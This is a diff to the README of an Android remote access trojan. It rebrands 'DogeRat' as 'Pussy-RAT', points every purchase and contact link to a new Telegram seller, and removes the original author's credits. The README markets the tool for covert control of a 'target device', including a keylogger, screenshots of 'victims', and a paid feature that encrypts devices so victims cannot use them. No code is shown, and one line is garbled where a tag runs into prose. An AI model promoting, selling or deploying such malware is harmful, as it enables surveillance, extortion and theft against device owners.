@@ -5,7 +5,7 @@
     <img src="images/logo.PNG" alt="logo" style="max-width: auto; height: auto;" />
   </p>
   <p>
-    <i>A multifunctional Telegram-based Android RAT without port forwarding</i>
+    <i>A Powerfull Telegram-based Android RAT without port forwarding by @zidhuxd</i>
   </p>
 </div>
 
@@ -14,10 +14,10 @@
   <img src="images/4.jpg" alt="Screenshot 1" style="max-width: 100%; height: auto;" />
 </p>
 
-## About DogeRat
+## About Pussy-RAT
 #### The ultimate Android device control tool, empowering you with seamless, secure, and limitless control over target device  
-#### DogeRat is powered by the latest and greatest technologies, ensuring a top-tier experience    
-#### DogeRat comprises primary components:
+#### Pussy-RAT is powered by the latest and greatest technologies, ensuring a top-tier experience    
+#### Pussy-RAT comprises primary components:
 - <strong>Server side:</strong> Powered by Node.js, Express.js, and Socket.IO
 - <strong>Android APK:</strong> Powered by Kotlin
 
@@ -42,7 +42,7 @@
 - 🔐 Keylogger
 - ✨ Beautiful Telegram bot interface
 
-### DogeRat Paid Version Features
+### Pussy-RAT Paid Version Features
 - 🤖 Auto permission
 - 🔐 Encrypt/Decrypt (after encryption, victims will not be able to use their devices)
 - 🖥️ Screenshot (get screenshot from your victim device)
@@ -58,33 +58,33 @@
 - And more...
 
 <p align="center">
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields Looking for a way to contact the developer or learn more about DogeRat? Reach out via our [Telegram channel](https://t.me/shivaya_dav):
 
 <div align="center">
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white">
   </a>
 </div>
 
 <h2 align="center">🔗 Contact and Social Media Accounts</h2>
 <p align="center">
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/CONTACT-TELEGRAM-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/CONTACT-INSTAGRAM-red?style=for-the-badge&logo=instagram" alt="Instagram Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/CONTACT-TWITTER-blue?style=for-the-badge&logo=twitter" alt="Twitter Badge"/>
   </a>
-  <a href="https://t.me/shivaya_dav">
+  <a href="https://t.me/zidhuxd">
     <img src="https://img.shields.io/badge/CONTACT-YOUTUBE-red?style=for-the-badge&logo=youtube" alt="Youtube Badge"/>
   </a>
 </p>
@@ -102,28 +102,10 @@
 </p>
 
 <p align="center">
-  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Telegram handle is <a href="https://t.me/shivaya_dav"><code>@shivaya_dav</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
+  <b><i>Important:</i></b> To prevent any fraudulent activity, please ensure that the Telegram handle is <a href="https://t.me/zidhuxd"><code>@zidhuxd</code></a>. Beware of scams and phishing attempts that use similar usernames or handles.
 </p>
 
 <p align="center">
-  <b><i>Thank you for using DogeRat - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
+  <b><i>Thank you for using Pussy-RAT - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
 </p>
-
-<h1 align="center">Sponsorship</h1>
-<p align="center">If you find my work valuable, you can show your support by sponsoring me. Your contribution will help me maintain and improve my projects, and it will encourage me to create more useful content.</p>
-<p align="center">
-  <a href="https://t.me/shivaya_dav"><img src="https://img.shields.io/badge/-Buy%20me%20a%20coffee-orange?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Buy me a coffee"></a>
-</p>
-
-<p align="center">Thank you to the following people for their support:</p>
-<div align="center">
-  <a href="https://github.com/shivaya-dav/DogeRat/stargazers">
-    <img src="https://reporoster.com/stars/dark/shivaya-dav/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
-  </a>
-  <br>
-  -------------------------
-  <br>
-  <a href="https://github.com/shivaya-dav/DogeRat/network/members">
-    <img src="https://reporoster.com/forks/dark/shivaya-dav/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
-  </a>
 </div>
